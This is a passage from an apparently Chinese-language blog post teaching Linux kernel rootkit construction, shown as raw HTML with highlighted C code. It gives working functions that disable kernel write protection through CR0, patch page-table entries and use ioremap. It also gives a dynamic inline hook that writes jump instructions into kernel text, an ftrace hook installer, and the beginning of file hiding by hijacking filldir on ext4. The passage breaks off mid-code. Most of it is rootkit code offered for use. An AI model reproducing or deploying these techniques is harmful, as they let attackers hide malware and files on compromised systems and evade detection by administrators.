 cr0_val = rootkit_read_cr0();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((cr0_val &gt;&gt; <span class="number">16</span>) &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cr0_val &amp;= ~(<span class="number">1</span> &lt;&lt; <span class="number">16</span>);</span><br><span class="line">        rootkit_write_cr0(cr0_val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_enable_write_protect</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> cr0_val;</span><br><span class="line"></span><br><span class="line">    cr0_val = rootkit_read_cr0();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!((cr0_val &gt;&gt; <span class="number">16</span>) &amp; <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        cr0_val |= (<span class="number">1</span> &lt;&lt; <span class="number">16</span>);</span><br><span class="line">        rootkit_write_cr0(cr0_val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_write_read_only_mem_by_cr0</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">void</span> *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> orig_cr0;</span><br><span class="line"></span><br><span class="line">    orig_cr0 = rootkit_read_cr0();</span><br><span class="line"></span><br><span class="line">    rootkit_disable_write_protect();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(dst, src, len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((orig_cr0 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        rootkit_enable_write_protect();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>方法二：直接修改内核页表项</strong></p><p>在内核中管理内存页使用的是页表，因为是对页进行管理的缘故，所以内存地址都是按照4K对齐的，意味着在pte中的64位只需要24位来对物理地址进行标识，其余的位只标识当前页框的属性并且当前页框是否可写也被标识在其中。</p><p>因此我们想要对只读内存进行修改可以直接修改掉其对应页表项的R&#x2F;W标识位即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/pgtable_types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_write_romem_by_pte_patch</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">void</span> *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pte_t</span> *dst_pte;</span><br><span class="line">    <span class="keyword">pte_t</span> orig_pte_val;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> level;</span><br><span class="line"></span><br><span class="line">    dst_pte = lookup_address((<span class="keyword">unsigned</span> <span class="keyword">long</span>) dst, &amp;level);</span><br><span class="line">    orig_pte_val.pte = dst_pte-&gt;pte;</span><br><span class="line"></span><br><span class="line">    dst_pte-&gt;pte |= _PAGE_RW;</span><br><span class="line">    <span class="built_in">memcpy</span>(dst, src, len);</span><br><span class="line"></span><br><span class="line">    dst_pte-&gt;pte = orig_pte_val.pte;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>方法三：通过ioremap实现物理内存直接改写</strong></p><p>这里<code>ioremap</code>函数的作用是将物理地址重新映射到一个虚拟地址上。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_write_read_only_mem_by_ioremap</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">void</span> *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> dst_phys_page_addr, dst_offset;</span><br><span class="line">    <span class="keyword">size_t</span> dst_ioremap_addr;</span><br><span class="line"></span><br><span class="line">    dst_phys_page_addr = page_to_pfn(virt_to_page(dst)) * PAGE_SIZE;</span><br><span class="line">    dst_offset = (<span class="keyword">size_t</span>)dst &amp; <span class="number">0xfff</span>;</span><br><span class="line"></span><br><span class="line">    dst_ioremap_addr = (<span class="keyword">size_t</span>)ioremap(dst_phys_page_addr, len + <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(dst_ioremap_addr + dst_offset, src, len);</span><br><span class="line">    iounmap(dst_ioremap_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里通过<code>virt_to_page</code>和<code>page_to_pfn</code>两个函数找到需要修改的地址的物理地址，随后进行重新映射直接修改最后<code>iounmap</code>即可。</p><h3 id="inline-hook"><a href="#inline-hook" class="headerlink" title="inline hook"></a>inline hook</h3><p><code>inline hook</code>即内联钩子是一种比较经典的思路，其核心原理是将函数中的hook点位修改为一个跳转指令，使其跳转至恶意代码处，在完成恶意代码执行之后恢复执行原本被跳转指令所覆盖掉的指令并最终跳转回原函数本该执行的指令，这样可以在不破坏原函数功能情况下完成恶意代码的执行。</p><p><img   src="/images/test.png"  alt="test"></p><p>但是对于x86而言，其为CISC指令集，指令的长度是并不固定的，这也意味着我们在进行inline hook的时候不但需要将原指令patch为跳转指令，还需要保存和识别原有指令一遍在完成恶意代码执行后进行执行。</p><h3 id="动态inline-hook技术"><a href="#动态inline-hook技术" class="headerlink" title="动态inline hook技术"></a>动态inline hook技术</h3><p>这一技术是a3大佬给出的一种新的技术。其原理也较为简单，主要实现以下步骤即可：</p><ol><li>保存将被hook点位上的数据（长度为跳转指令的长度）</li><li>修改hook点位为跳转指令，使程序执行流能够跳转到恶意函数</li><li>在恶意函数内部实现恢复hook点位的数据，随后调用hook点位</li><li>最后重新将hook点位的数据修改为跳转指令的长度，之后正常返回</li></ol><p>这种方式不会破坏函数调用栈并且也不需要对hook点位上的指令做识别。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOOK_BUF_SZ 0x30</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_write_read_only_mem_by_ioremap</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">void</span> *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> dst_phys_page_addr, dst_offset;</span><br><span class="line">    <span class="keyword">size_t</span> dst_ioremap_addr;</span><br><span class="line"></span><br><span class="line">    dst_phys_page_addr = page_to_pfn(virt_to_page(dst)) * PAGE_SIZE;</span><br><span class="line">    dst_offset = (<span class="keyword">size_t</span>)dst &amp; <span class="number">0xfff</span>;</span><br><span class="line"></span><br><span class="line">    dst_ioremap_addr = (<span class="keyword">size_t</span>)ioremap(dst_phys_page_addr, len + <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(dst_ioremap_addr + dst_offset, src, len);</span><br><span class="line">    iounmap(dst_ioremap_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hook_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> hook_data[HOOK_BUF_SZ];</span><br><span class="line">    <span class="keyword">char</span> orig_data[HOOK_BUF_SZ];</span><br><span class="line">    <span class="keyword">size_t</span> (*orig_func)(<span class="keyword">size_t</span>, <span class="keyword">size_t</span>, <span class="keyword">size_t</span>, <span class="keyword">size_t</span>, <span class="keyword">size_t</span>, <span class="keyword">size_t</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hook_info</span> <span class="title">temp_hook_info</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">rootkit_evil_hook_fn_temp</span><span class="params">(<span class="keyword">size_t</span> arg0, <span class="keyword">size_t</span> arg1, <span class="keyword">size_t</span> arg2,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 <span class="keyword">size_t</span> arg3, <span class="keyword">size_t</span> arg4, <span class="keyword">size_t</span> arg5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">6</span>], ret;</span><br><span class="line"></span><br><span class="line">    args[<span class="number">0</span>] = arg0;</span><br><span class="line">    args[<span class="number">1</span>] = arg1;</span><br><span class="line">    args[<span class="number">2</span>] = arg2;</span><br><span class="line">    args[<span class="number">3</span>] = arg3;</span><br><span class="line">    args[<span class="number">4</span>] = arg4;</span><br><span class="line">    args[<span class="number">5</span>] = arg5;</span><br><span class="line"></span><br><span class="line">    rootkit_write_read_only_mem_by_ioremap(temp_hook_info.orig_func,</span><br><span class="line">                                           temp_hook_info.orig_data,</span><br><span class="line">                                           HOOK_BUF_SZ);</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line">    ret = temp_hook_info.orig_func(args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>],</span><br><span class="line">                                   args[<span class="number">3</span>], args[<span class="number">4</span>], args[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">    rootkit_write_read_only_mem_by_ioremap(temp_hook_info.orig_func,</span><br><span class="line">                                           temp_hook_info.hook_data,</span><br><span class="line">                                           HOOK_BUF_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_text_hook</span><span class="params">(<span class="keyword">void</span> *hook_dst, <span class="keyword">void</span> *new_dst, struct hook_info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> jmp_offset;</span><br><span class="line"></span><br><span class="line">    info-&gt;orig_func = hook_dst;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;info-&gt;orig_data, info-&gt;orig_func, HOOK_BUF_SZ);</span><br><span class="line"></span><br><span class="line">    jmp_offset = (<span class="keyword">size_t</span>)new_dst - (<span class="keyword">size_t</span>)hook_dst - <span class="number">12</span>;</span><br><span class="line">    info-&gt;hook_data[<span class="number">0</span>] = <span class="number">0xE9</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(&amp;info-&gt;hook_data[<span class="number">1</span>]) = jmp_offset;</span><br><span class="line"></span><br><span class="line">    rootkit_write_read_only_mem_by_ioremap(info-&gt;orig_func, &amp;info-&gt;hook_data,</span><br><span class="line">                                           HOOK_BUF_SZ);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述则是对动态inline hook的实现代码。</p><h3 id="ftrace-hook"><a href="#ftrace-hook" class="headerlink" title="ftrace hook"></a>ftrace hook</h3><p><code>ftrace</code>是内核提供的一个调试框架，当内核编译时开启了<code>CONFIG_FUNCTION_TRACER</code>选项可以使用<code>ftrace</code>来对内核函数调用进行追踪。</p><p><code>ftrace</code>通过在函数开头插入<code>fentry</code>或<code>mcount</code>实现，为了降低性能损耗，在编译时会在函数的开头插入 <code>nop</code> 指令，当开启 frace 时再动态地将待跟踪函数开头的 <code>nop</code> 指令替换为跳转指令。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*<span class="keyword">ftrace_func_t</span>)</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> ip, <span class="keyword">unsigned</span> <span class="keyword">long</span> parent_ip,</span></span></span><br><span class="line"><span class="params"><span class="function">      struct ftrace_ops *op, struct ftrace_regs *fregs)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ftrace_ops</span> &#123;</span></span><br><span class="line"><span class="keyword">ftrace_func_t</span>func;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ftrace_ops</span> __<span class="title">rcu</span>*<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>flags;</span><br><span class="line"><span class="keyword">void</span>*<span class="keyword">private</span>;</span><br><span class="line"><span class="keyword">ftrace_func_t</span>saved_func;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DYNAMIC_FTRACE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ftrace_ops_hash</span><span class="title">local_hash</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ftrace_ops_hash</span>*<span class="title">func_hash</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ftrace_ops_hash</span><span class="title">old_hash</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>trampoline;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>trampoline_size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">list</span>;</span></span><br><span class="line"><span class="keyword">ftrace_ops_func_t</span>ops_func;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DYNAMIC_FTRACE_WITH_DIRECT_CALLS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>direct_call;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>ftrace</code>的核心结构就是<code>ftrace_ops</code>，其中的<code>func</code>成员就是最终会被调用的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ftrace_set_filter_ip - set a function to filter on in ftrace by address</span></span><br><span class="line"><span class="comment"> * @ops: the ops to set the filter with</span></span><br><span class="line"><span class="comment"> * @ip: the address to add to or remove from the filter.</span></span><br><span class="line"><span class="comment"> * @remove: non zero to remove the ip from the filter</span></span><br><span class="line"><span class="comment"> * @reset: non zero to reset all filters before applying this filter.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Filters denote which functions should be enabled when tracing is enabled</span></span><br><span class="line"><span class="comment"> * If @ip is NULL, it fails to update filter.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This can allocate memory which must be freed before @ops can be freed,</span></span><br><span class="line"><span class="comment"> * either by removing each filtered addr or by using</span></span><br><span class="line"><span class="comment"> * ftrace_free_filter(@ops).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ftrace_set_filter_ip</span><span class="params">(struct ftrace_ops *ops, <span class="keyword">unsigned</span> <span class="keyword">long</span> ip,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">int</span> remove, <span class="keyword">int</span> reset)</span></span></span><br></pre></td></tr></table></figure><p>当创建好一个<code>ftrace_ops</code>之后，可以使用上述<code>ftrace_set_filter_ip</code>函数将其注册到filter中，同样也可以使用该函数将<code>ftrace_ops</code>从filter中删除。在完成注册操作后可以使用<code>register_ftrace_function</code>函数将其放置到hook点位上，同样可以使用<code>unregister_ftrace_function</code>函数将其脱离。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct ftrace_ops *<span class="title">rootkit_ftrace_hook_install</span><span class="params">(<span class="keyword">void</span> *hook_dst,</span></span></span><br><span class="line"><span class="params"><span class="function">                                               <span class="keyword">ftrace_func_t</span> new_dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ftrace_ops</span> *<span class="title">hook_ops</span>;</span></span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">    hook_ops = kmalloc(GFP_KERNEL, <span class="keyword">sizeof</span>(*hook_ops));</span><br><span class="line">    hook_ops-&gt;func = new_dst;</span><br><span class="line">    hook_ops-&gt;flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;</span><br><span class="line"></span><br><span class="line">    err = ftrace_set_filter_ip(hook_ops, hook_dst, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;[rootkit:] failed to set ftrace filter.&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = register_ftrace_function(hook_ops);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;[rootkit:] failed to register ftrace fn.&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[rootkit:] register ftrace hook at %p&quot;</span>, hook_dst);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hook_ops;</span><br><span class="line"></span><br><span class="line">failed:</span><br><span class="line">    kfree(hook_ops);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rootkit_ftrace_hook_remove</span><span class="params">(struct ftrace_ops *hook_ops, <span class="keyword">void</span> *hook_dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">    err = unregister_ftrace_function(hook_ops);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;[rootkit:] failed to unregister ftrace.&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = ftrace_set_filter_ip(hook_ops, hook_dst, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;[rootkit:] failed to rmove ftrace point.&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h2><p>在前一篇文章中虽然提到的文件隐藏但是只是针对仅存在于内存中的文件系统</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">simple_dir_operations</span> =</span> &#123;</span><br><span class="line">.open= dcache_dir_open,</span><br><span class="line">.release= dcache_dir_close,</span><br><span class="line">.llseek= dcache_dir_lseek,</span><br><span class="line">.read= generic_read_dir,</span><br><span class="line">.iterate_shared= dcache_readdir,</span><br><span class="line">.fsync= noop_fsync,</span><br><span class="line">&#125;;</span><br><span class="line">EXPORT_SYMBOL(simple_dir_operations);</span><br></pre></td></tr></table></figure><p>这类文件系统通常使用<code>simple_dir_operations</code>作为函数表，文件遍历函数为<code>dcache_readdir</code>。</p><p>但是对于现实环境中的大多系统通常使用的ext4文件系统，前面针对内核的隐藏行就不那么行的通了。</p><h3 id="劫持getdents系统调用核心函数"><a href="#劫持getdents系统调用核心函数" class="headerlink" title="劫持getdents系统调用核心函数"></a>劫持getdents系统调用核心函数</h3><p>在使用ls查看目录下的文件时，实际上会调用<code>getdents64</code>&#x2F;<code>getdents</code>&#x2F;<code>compat_getdents</code>这三个系统调用其中的一个，而他们的核心逻辑都是<code>iterate_dir</code>实现的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">iterate_dir</span><span class="params">(struct file *file, struct dir_context *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file_inode(file);</span><br><span class="line"><span class="keyword">int</span> res = -ENOTDIR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!file-&gt;f_op-&gt;iterate_shared)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">res = security_file_permission(file, MAY_READ);</span><br><span class="line"><span class="keyword">if</span> (res)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">res = fsnotify_file_perm(file, MAY_READ);</span><br><span class="line"><span class="keyword">if</span> (res)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">res = down_read_killable(&amp;inode-&gt;i_rwsem);</span><br><span class="line"><span class="keyword">if</span> (res)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">res = -ENOENT;</span><br><span class="line"><span class="keyword">if</span> (!IS_DEADDIR(inode)) &#123;</span><br><span class="line">ctx-&gt;pos = file-&gt;f_pos;</span><br><span class="line">res = file-&gt;f_op-&gt;iterate_shared(file, ctx);</span><br><span class="line">file-&gt;f_pos = ctx-&gt;pos;</span><br><span class="line">fsnotify_access(file);</span><br><span class="line">file_accessed(file);</span><br><span class="line">&#125;</span><br><span class="line">inode_unlock_shared(inode);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(iterate_dir);</span><br></pre></td></tr></table></figure><p>最终都会调用到<code>file-&gt;f_op-&gt;iterate_shared</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">ext4_dir_operations</span> =</span> &#123;</span><br><span class="line">.llseek= ext4_dir_llseek,</span><br><span class="line">.read= generic_read_dir,</span><br><span class="line">.iterate_shared= ext4_readdir,</span><br><span class="line">.unlocked_ioctl = ext4_ioctl,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_ioctl= ext4_compat_ioctl,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">.fsync= ext4_sync_file,</span><br><span class="line">.release= ext4_release_dir,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以ext4为例，最终调用<code>ext4_readdir</code>函数。其存在这样一条调用链<code>ext4_readdir</code> &#x3D;&gt; <code>ext4_dx_readdir</code> &#x3D;&gt; <code>call_filldir</code> &#x3D;&gt; <code>dir_emit</code> &#x3D;&gt; <code>ctx-&gt;actor</code>。</p><p>上述调用链中填充数据并返回给用户态的核心函数便是调用<code>ctx-&gt;actor</code>，而其真正调用的是<code>filldir</code>&#x2F;<code>filldir64</code>&#x2F;<code>compat_filldir</code>函数。</p><p>所以结合前文的函数劫持技术，这里可以直接对<code>filldir</code>&#x2F;<code>filldir64</code>&#x2F;<code>compat_filldir</code>函数进行劫持，在遇到我们隐藏文件时直接返回从而达到隐藏文件的效果。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 